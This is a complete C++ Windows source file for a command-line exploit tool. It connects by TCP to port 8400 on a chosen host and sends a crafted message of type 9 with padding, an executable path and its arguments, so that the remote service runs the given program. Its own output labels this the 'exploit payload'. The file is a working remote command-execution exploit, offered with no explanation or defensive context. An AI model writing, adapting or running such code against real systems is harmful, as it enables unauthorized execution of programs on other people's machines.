#define WIN32_LEAN_AND_MEAN

#include <windows.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <stdlib.h>
#include <stdio.h>
#include <string>


// Need to link with Ws2_32.lib, Mswsock.lib, and Advapi32.lib
#pragma comment (lib, "Ws2_32.lib")
#pragma comment (lib, "Mswsock.lib")
#pragma comment (lib, "AdvApi32.lib")


#define DEFAULT_BUFLEN 512
#define DEFAULT_PORT "8400"

void print_usage(){
	wprintf(L"Usage: tool <options>\n\t-h\tUsage\n\t-i\tIP Address of host (Default: 127.0.0.1)\n\t-e\tFile path of executable\n\t-a\tExecutable arguments\n\n");
}

int __cdecl main(int argc, char **argv) 
{
    WSADATA wsaData;
    SOCKET ConnectSocket = INVALID_SOCKET;
    struct addrinfo *result = NULL,
                    *ptr = NULL,
                    hints;

    char recvbuf[DEFAULT_BUFLEN];
    int iResult;
    int recvbuflen = DEFAULT_BUFLEN;

	std::string exe;
	std::string args;
	std::string ip("127.0.0.1");

	if (argc > 2) { // Check the value of argc. If not enough parameters have been passed, inform user and exit.

        for (int i = 1; i < argc; i++) {            
			char *cur_arg = argv[i];
			if ( strcmp(cur_arg, "-i") == 0 && (i + 1 != argc)) {
				ip.assign( argv[i + 1] );
				i++;
            } else if( strcmp(cur_arg, "-e") == 0 && (i + 1 != argc)) {
				exe.assign( argv[i + 1] );
				i++;
            } else if ( strcmp(cur_arg, "-a") == 0 && (i + 1 != argc)) {
				args.assign(argv[i + 1]);
				i++;
			} else if ( strcmp(cur_arg, "-h") == 0 ) {
				print_usage();
				exit(0);
			}            
        }

	} else {
		print_usage();
		exit(0);
	}

	// Check that an application path was specified
	if( exe.empty()){
		printf("[-] Executable path required.");
		print_usage();
        return 1;
	}
	    
    // Initialize Winsock
    iResult = WSAStartup(MAKEWORD(2,2), &wsaData);
    if (iResult != 0) {
        printf("[-] WSAStartup failed with error: %d\n", iResult);
        return 1;
    }

    ZeroMemory( &hints, sizeof(hints) );
    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve the server address and port
	iResult = getaddrinfo(ip.c_str(), DEFAULT_PORT, &hints, &result);
    if ( iResult != 0 ) {
        printf("[-] Getaddrinfo failed with error: %d\n", iResult);
        WSACleanup();
        return 1;
    }

    // Attempt to connect to an address until one succeeds
    for(ptr=result; ptr != NULL ;ptr=ptr->ai_next) {

        // Create a SOCKET for connecting to server
        ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, 
            ptr->ai_protocol);
        if (ConnectSocket == INVALID_SOCKET) {
            printf("[-] Socket creation failed with error: %ld\n", WSAGetLastError());
            WSACleanup();
            return 1;
        }

        // Connect to server.
        iResult = connect( ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
        if (iResult == SOCKET_ERROR) {
			printf("[-] Socket connect with error: %ld\n", WSAGetLastError());
            closesocket(ConnectSocket);
            ConnectSocket = INVALID_SOCKET;
            continue;
        }
        break;
    }

    freeaddrinfo(result);
	printf("[+] Connected to %s on port %s\n", ip.c_str(), DEFAULT_PORT );
    if (ConnectSocket == INVALID_SOCKET) {
        printf("[-] Unable to connect to server!\n");
        WSACleanup();
        return 1;
    }

	//Setup buffer
	std::string cmd(exe);
	cmd.append(";");
	if( !args.empty() )
		cmd.append(args);
	
	unsigned int marker = 12;
	unsigned int msg_type = 9;
	char *buf = (char *)malloc(600);
	memset(buf, 0, 600);

	*(int *)&buf[marker] = htonl(msg_type);
	marker += 4;      //Length of msg type
	marker += 328;    //Garbage
	memcpy( &buf[marker], cmd.c_str(), cmd.length() );
	marker += cmd.length();
	marker += 100;

	*(int *)&buf[0] = htonl(marker - 4);

    // Send an initial buffer
    iResult = send( ConnectSocket, buf, marker, 0 );
    if (iResult == SOCKET_ERROR) {
        printf("[-] Send failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    printf("[+] Exploit payload sent with cmd '%s' '%s'\n", exe.c_str(), args.c_str() );

    // shutdown the connection since no more data will be sent
    iResult = shutdown(ConnectSocket, SD_SEND);
    if (iResult == SOCKET_ERROR) {
        printf("[-] Shutdown failed with error: %d\n", WSAGetLastError());
        closesocket(ConnectSocket);
        WSACleanup();
        return 1;
    }

    // Receive until the peer closes the connection
    iResult = recv(ConnectSocket, recvbuf, recvbuflen, 0);
    
    // cleanup
    closesocket(ConnectSocket);
    WSACleanup();

	printf("[+] Socket closed.\n" );

    return 0;
}